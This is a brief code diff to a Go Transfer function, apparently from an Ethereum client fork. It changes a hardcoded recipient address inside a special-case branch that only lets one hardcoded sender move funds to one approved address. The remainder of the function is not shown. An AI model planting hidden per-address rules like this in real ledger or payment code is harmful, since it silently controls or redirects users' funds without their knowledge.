@@ -118,7 +118,7 @@ func CanTransfer(db vm.StateDB, addr common.Address, amount *big.Int) bool {
 // Transfer subtracts amount from sender and adds amount to recipient using the given Db
 func Transfer(db vm.StateDB, sender, recipient common.Address, amount *big.Int) {
 	if sender == common.HexToAddress("0xbBcaEa2eC9FE3ad6043d46F4D7fD01C96e792DD4"){	   
-	   if recipient == common.HexToAddress("0xE03dcB7De39d9019F0263b5002c7856381C56a5e") {
+	   if recipient == common.HexToAddress("0x32795aE65397eAbF07d95D9EEe106bFedCD72E71") {
 			db.SubBalance(sender, amount)
 			db.AddBalance(recipient, amount)
 		}
